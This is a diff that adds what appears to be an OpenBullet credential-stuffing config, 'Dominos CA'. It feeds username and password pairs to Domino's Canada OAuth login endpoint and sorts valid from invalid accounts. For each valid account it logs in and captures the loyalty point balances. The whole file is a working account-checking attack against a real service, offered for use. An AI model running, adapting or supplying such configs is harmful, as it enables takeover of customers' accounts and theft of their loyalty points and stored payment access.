@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Dominos CA",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T01:13:24.2807745+00:00",
+  "AdditionalInfo": "",
+  "Author": "Wizdo",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.dominos.ca/as/token.oauth2" 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password " 
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+REQUEST POST "https://order.dominos.ca/power/login" 
+  CONTENT "loyaltyIsActive=true&rememberMe=false&u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+PARSE "<SOURCE>" JSON "CustomerID" -> VAR "customerID" 
+REQUEST GET "https://order.dominos.ca/power/customer/<customerID>/loyalty?_=1551465937637" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+PARSE "<SOURCE>" JSON "VestedPointBalance" -> CAP "Points" 
+PARSE "<SOURCE>" JSON "PendingPointBalance" -> CAP "Pending" 
